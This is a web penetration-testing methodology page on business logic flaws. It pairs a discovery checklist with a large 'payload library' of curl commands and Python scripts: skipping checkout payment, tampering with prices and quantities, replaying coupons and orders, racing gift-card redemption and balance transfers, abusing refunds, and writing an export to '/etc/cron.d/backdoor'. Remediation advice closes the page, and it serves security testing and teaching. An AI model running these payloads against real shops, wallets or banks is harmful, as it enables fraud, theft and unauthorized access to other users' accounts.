---
title: "Business Logic Flaws"
date: 2026-02-24
draft: false
---

# Business Logic Flaws

> **Severity**: High–Critical | **CWE**: CWE-840, CWE-841
> **OWASP**: A04:2021 – Insecure Design

---

## What Are Business Logic Flaws?

Business logic flaws are vulnerabilities in the application's intended workflow — not in code syntax or data handling, but in the rules governing what users can do, in what order, and under what conditions. They are rarely detected by scanners because they require understanding of how the application *should* work to recognize when it doesn't.

Categories:
- **Workflow bypass**: skip required steps in multi-stage processes
- **State manipulation**: replay, reorder, or forge intermediate states
- **Trust boundary violations**: assume server validates what only the client should validate
- **Negative value / quantity abuse**: negative prices, zero quantities
- **Promo/coupon abuse**: apply multiple times, stack with other discounts
- **Privilege escalation via logic**: reach high-privilege state through low-privilege path

```
Example:
  Checkout flow: add_to_cart → apply_coupon → payment → confirm
  Flaw: payment step doesn't verify coupon wasn't applied to different cart
  → Apply coupon for $100 cart, start payment for $10 cart → pay $10-$100 = -$90

  Expected: coupon_discount applied to paid_cart = current_cart
  Actual:   coupon_discount applied to any pending checkout
```

---

## Discovery Checklist

**Phase 1 — Map the Application Flow**
- [ ] Walk through every multi-step workflow: registration, checkout, password reset, account upgrade, document submission
- [ ] Note: what state is tracked server-side vs client-side vs URL parameters
- [ ] Identify: intermediate states that have value (pre-payment confirmation, applied discounts, free trial state)
- [ ] Note all trust assumptions: "user who reaches /checkout/confirm must have paid"

**Phase 2 — Probe Workflow Assumptions**
- [ ] Skip steps in multi-step flows — go directly to step 3 without completing step 2
- [ ] Repeat steps — complete the same step twice (double discount, double reward)
- [ ] Reorder steps — complete step 3 before step 2
- [ ] Replay old/expired tokens — reuse a completed checkout token to generate another order
- [ ] Parameter tampering — modify price/quantity/discount fields in transit

**Phase 3 — Test Edge Cases**
- [ ] Negative quantities, negative prices, zero amounts
- [ ] Concurrent requests for single-use resources (race condition overlap)
- [ ] Privilege transitions: does upgrading from free to paid, then downgrading, retain paid features?
- [ ] Coupon/promo codes: apply more than once, combine with other promotions
- [ ] Account deletion/deactivation: can actions complete after account deactivation?

---

## Payload Library

### Payload 1 — Workflow Step Skipping

```bash
# Multi-step checkout — skip payment step:
# Step 1: Add item → cart_id=ABC123 (legitimate)
curl -b "session=SESS" "https://target.com/cart/add" -d "item=PROD1&qty=1"

# Step 2: Normally: payment page → process payment → receive confirmation token
# SKIP payment — directly access confirmation endpoint:
curl -b "session=SESS" "https://target.com/checkout/confirm" \
  -d "cart_id=ABC123&order_status=paid"

# Or: intercept confirmation redirect, replay with manipulated parameters:
# Original confirmation: GET /checkout/complete?order_id=ORD123&status=paid&sig=HASH
# If status is client-controlled:
curl -b "session=SESS" "https://target.com/checkout/complete?order_id=ORD123&status=paid"

# Multi-step registration — skip email verification:
# Step 1: Register → get user_id, status=pending
curl "https://target.com/api/register" -d '{"email":"attacker@evil.com","password":"x"}' \
  -H "Content-Type: application/json"

# Step 3: Access account features that require verified status — without verifying:
# Access premium features assuming verified=true:
curl -b "session=SESSION_FROM_REGISTER" "https://target.com/api/premium/feature"

# Password reset workflow — skip "enter old password" step:
# Some apps: /account/settings/password accepts new_password without requiring old_password
# if you have a valid session:
curl -b "session=VALID_SESSION" "https://target.com/account/settings/password" \
  -X POST -d "new_password=NewPass123!&confirm_password=NewPass123!"
# (no old_password field) → logic flaw if accepted

# Account upgrade workflow — skip payment confirmation:
# POST /api/subscription/upgrade with plan=premium → redirect to payment
# After payment redirect, try: POST /api/subscription/confirm?plan=premium
curl -b "session=USER_SESSION" "https://target.com/api/subscription/confirm" \
  -X POST -H "Content-Type: application/json" \
  -d '{"plan":"enterprise","payment_confirmed":true}'
```

### Payload 2 — Price and Quantity Manipulation

```bash
# Price tampering — modify price in transit (client-side price):
# Intercept: POST /cart/checkout with {"items":[{"id":"PROD1","price":99.99,"qty":1}]}
# Modify:
curl -b "session=SESSION" "https://target.com/cart/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items":[{"id":"PROD1","price":0.01,"qty":1}]}'

# Or: modify total field directly:
curl -b "session=SESSION" "https://target.com/cart/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items":[{"id":"PROD1","qty":1}],"total":0.01}'

# Negative quantity (receive money for returning item you never bought):
curl -b "session=SESSION" "https://target.com/api/order" \
  -H "Content-Type: application/json" \
  -d '{"product_id":"PROD1","quantity":-1,"price":99.99}'
# If processed: credit of $99.99 added to account

# Currency confusion — send different currency than expected:
curl -b "session=SESSION" "https://target.com/api/payment" \
  -H "Content-Type: application/json" \
  -d '{"amount":99.99,"currency":"JPY"}'
# If backend converts: $99.99 JPY ≈ $0.67 USD → significant discount

# Apply discount coupon more than once:
for i in {1..5}; do
  curl -b "session=SESSION" "https://target.com/api/coupon/apply" \
    -X POST -d '{"code":"SAVE20","cart_id":"CART123"}'
  echo "Apply #$i"
done
# Check if discount stacks each time

# Free shipping threshold manipulation:
# If free shipping triggers at $50+, and item price is client-controlled:
curl -b "session=SESSION" "https://target.com/cart/checkout" \
  -d '{"items":[{"id":"ITEM1","price":50.01,"qty":1}],"shipping_method":"free"}'
# Then modify price down post-threshold check
```

### Payload 3 — State Replay and Token Reuse

```python
#!/usr/bin/env python3
"""
Test for state replay vulnerabilities
"""
import requests, time

s = requests.Session()
s.cookies.set('session', 'YOUR_SESSION')
base = "https://target.com"

# Scenario 1: Replay a used discount code
def test_coupon_replay():
    # Apply coupon first time:
    r1 = s.post(f"{base}/api/coupon/apply",
                json={"code":"WELCOME50","cart_id":"CART1"})
    print(f"First apply: {r1.status_code} → {r1.json()}")

    # Attempt second apply (same coupon, same cart):
    r2 = s.post(f"{base}/api/coupon/apply",
                json={"code":"WELCOME50","cart_id":"CART1"})
    print(f"Second apply (same cart): {r2.status_code} → {r2.json()}")

    # New cart — apply used coupon:
    r3 = s.post(f"{base}/api/coupon/apply",
                json={"code":"WELCOME50","cart_id":"CART2"})
    print(f"New cart: {r3.status_code} → {r3.json()}")

# Scenario 2: Complete checkout twice with same cart
def test_order_replay():
    cart_id = "CART_WITH_ITEMS"
    # First checkout — legitimate:
    r1 = s.post(f"{base}/api/checkout/complete",
                json={"cart_id": cart_id})
    print(f"First checkout: {r1.status_code} → {r1.json()}")
    order_id = r1.json().get("order_id")

    # Replay same cart checkout:
    r2 = s.post(f"{base}/api/checkout/complete",
                json={"cart_id": cart_id})
    print(f"Replay checkout: {r2.status_code} → {r2.json()}")

# Scenario 3: Reference order from another user:
def test_cross_user_order():
    # Get own order_id from a legitimate purchase:
    own_order = "ORD_YOUR_ORDER"
    # Attempt to cancel other user's order using their order_id:
    for victim_order in ["ORD000001", "ORD000002", "ORD000003"]:
        r = s.post(f"{base}/api/orders/{victim_order}/cancel")
        print(f"Cancel {victim_order}: {r.status_code}")

test_coupon_replay()
test_order_replay()
test_cross_user_order()
```

### Payload 4 — Trust Boundary Violations

```bash
# Trust violation: server trusts client-side role/permission in request body:
# Normal: {"action":"view_report","user_id":"123"}
# Attack: {"action":"admin_export","user_id":"123","role":"admin","bypass":true}
curl -b "session=USER_SESSION" "https://target.com/api/action" \
  -H "Content-Type: application/json" \
  -d '{"action":"admin_export","role":"admin","is_admin":true}'

# Trust violation: server trusts email address from OAuth token without verifying
# ownership of claimed email at IDP:
# Register with Google OAuth using email=victim@corp.com → gains victim's access

# Trust violation: batch actions without per-item auth check:
# If server checks: "user can access items" → but checks only first item in batch:
curl -b "session=USER_SESSION" "https://target.com/api/batch/delete" \
  -H "Content-Type: application/json" \
  -d '{"item_ids": ["OWN_ITEM_1", "VICTIM_ITEM_1", "VICTIM_ITEM_2"]}'

# Trust violation: file path from client used directly:
curl -b "session=SESSION" "https://target.com/api/export" \
  -d '{"format":"csv","output_path":"/etc/cron.d/backdoor"}'

# Trust violation: IDOR in bulk operations:
# Endpoint processes list of IDs without checking ownership of each:
curl "https://target.com/api/messages/mark-read" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message_ids": [1,2,3,100,200,300]}'  # 100,200,300 are victim's messages

# Trust violation: hidden POST parameters override server-side state:
# If server sets account_type=free but user can override:
curl "https://target.com/api/profile/update" \
  -b "session=SESSION" \
  -d "display_name=Alice&account_type=premium&subscription_end=2099-12-31"
```

### Payload 5 — Account/Subscription Logic Abuse

```bash
# Free trial re-use — create multiple accounts to get repeated free trials:
# If trial check is: WHERE user_id = X AND trial_used = false
# → create new account each time (if registration is free)

# Downgrade and retain premium feature:
# Step 1: Upgrade to premium
# Step 2: Use premium features to create content/export data
# Step 3: Downgrade to free
# Step 4: Check if premium content/exports still accessible

# Account sharing bypass:
# If concurrent session limit enforced, try:
# - Modify User-Agent/IP to appear as different device
# - Use API endpoints directly (may not enforce session limit)
# - Long-lived API tokens not subject to session limit

# Referral bonus abuse:
# If referral reward given when referred user "signs up":
# Register multiple accounts using your referral code
# Some apps only check email uniqueness → use email+tag: user+1@example.com, user+2@...

# Credit/wallet logic:
# Add funds, buy something, request refund → refund to wallet + keep item
# → wallet balance preserved + item acquired
python3 << 'EOF'
import requests
s = requests.Session()
s.headers = {"Authorization": "Bearer YOUR_TOKEN", "Content-Type": "application/json"}

base = "https://target.com"

# Step 1: Add balance:
s.post(f"{base}/api/wallet/add", json={"amount": 100})
print("Added $100 to wallet")

# Step 2: Purchase (using wallet):
order = s.post(f"{base}/api/orders", json={"product_id": "PROD1", "payment": "wallet"})
order_id = order.json().get("order_id")
print(f"Order created: {order_id}")

# Step 3: Request refund while keeping item (refund to original payment = wallet):
refund = s.post(f"{base}/api/orders/{order_id}/refund", json={"reason": "not_satisfied"})
print(f"Refund: {refund.status_code} → {refund.json()}")

# Step 4: Check wallet balance — should be back to $100 while item is kept:
balance = s.get(f"{base}/api/wallet/balance")
print(f"Wallet balance: {balance.json()}")
EOF
```

### Payload 6 — Time-of-Check Time-of-Use (TOCTOU) Logic

```python
#!/usr/bin/env python3
"""
TOCTOU logic flaw exploitation
Exploit race condition in business logic checks
"""
import requests, threading, time

s1 = requests.Session()
s2 = requests.Session()
s1.headers = {"Authorization": "Bearer TOKEN1", "Content-Type": "application/json"}
s2.headers = {"Authorization": "Bearer TOKEN2", "Content-Type": "application/json"}

base = "https://target.com"

# Scenario: Gift card / one-time-use code
# Server checks code unused → marks used → credits account
# Race: two requests check before either marks used → both get credit

gift_code = "GIFT-XXXX-YYYY-ZZZZ"

results = []

def redeem(session, label):
    r = session.post(f"{base}/api/giftcard/redeem", json={"code": gift_code})
    results.append((label, r.status_code, r.json()))

# Launch simultaneous redemptions:
threads = [
    threading.Thread(target=redeem, args=(s1, "session1")),
    threading.Thread(target=redeem, args=(s2, "session2")),
]

# Sync start:
barrier = threading.Barrier(2)

def synced_redeem(session, label):
    barrier.wait()  # synchronize both threads at start
    redeem(session, label)

threads = [
    threading.Thread(target=synced_redeem, args=(s1, "session1")),
    threading.Thread(target=synced_redeem, args=(s2, "session2")),
]
for t in threads: t.start()
for t in threads: t.join()

for label, status, body in results:
    print(f"{label}: {status} → {body}")

# Scenario: Transfer limit bypass
# Check: balance >= amount → deduct balance
# Race: both checks pass before either deduction completes

AMOUNT = 1000  # slightly more than balance
def transfer():
    r = s1.post(f"{base}/api/transfer",
                json={"to": "ATTACKER_ACCT", "amount": AMOUNT})
    print(f"Transfer: {r.status_code} → {r.json()}")

threads = [threading.Thread(target=transfer) for _ in range(5)]
for t in threads: t.start()
for t in threads: t.join()
```

---

## Tools

```bash
# Burp Suite — primary tool for business logic testing:
# 1. Map complete application flow in Proxy history
# 2. Use Repeater to replay/modify individual steps
# 3. Use Sequencer to test state token predictability
# 4. Use Intruder for parameter brute-force/manipulation

# Custom flow automation with Python requests:
# Record authenticated session → replay with modifications

# OWASP Business Logic test cases reference:
# https://owasp.org/www-project-web-security-testing-guide/
# WSTG-BUSLOGIC-001 through WSTG-BUSLOGIC-009

# Look for logic flaws in JS source:
# Search for client-side price/discount calculation:
curl -s https://target.com/static/checkout.js | \
  grep -E "price|discount|total|coupon|free|premium" | head -30

# Test all HTTP methods on business logic endpoints:
for method in GET POST PUT PATCH DELETE; do
  curl -s -X $method "https://target.com/api/order/complete" \
    -b "session=SESSION" -w " → %{http_code}\n" -o /dev/null
done

# Automate multi-step flow with curl:
# Step 1: Add to cart:
CART=$(curl -s -b "session=SESS" -X POST "https://target.com/cart/add" \
  -d "product=PROD1&qty=1" | python3 -c "import sys,json; print(json.load(sys.stdin)['cart_id'])")

# Step 2: Skip payment, attempt confirmation:
curl -s -b "session=SESS" "https://target.com/checkout/confirm/$CART"
```

---

## Remediation Reference

- **Server-side state**: maintain all workflow state server-side — never trust client-provided state machine flags (`payment_confirmed=true`, `verified=true`)
- **Step enforcement**: for multi-step workflows, verify server-side that all previous required steps have completed before allowing the next step
- **Atomic operations**: wrap check-then-act operations in transactions with appropriate locking — use database transactions or optimistic locking for TOCTOU scenarios
- **Idempotency keys**: for payment and order operations, require unique idempotency keys — reject duplicate requests with same key
- **Server-side pricing**: never trust client-provided prices — always look up price from server-side catalog using product_id
- **Coupon/promo validation**: check per-user, per-cart, per-coupon usage limits atomically with the redemption in a single transaction
- **Audit trail**: log all business-critical actions with user ID, timestamp, and parameters — detect anomalies (multiple redemptions, negative amounts, price mismatches)

*Part of the Web Application Penetration Testing Methodology series.*
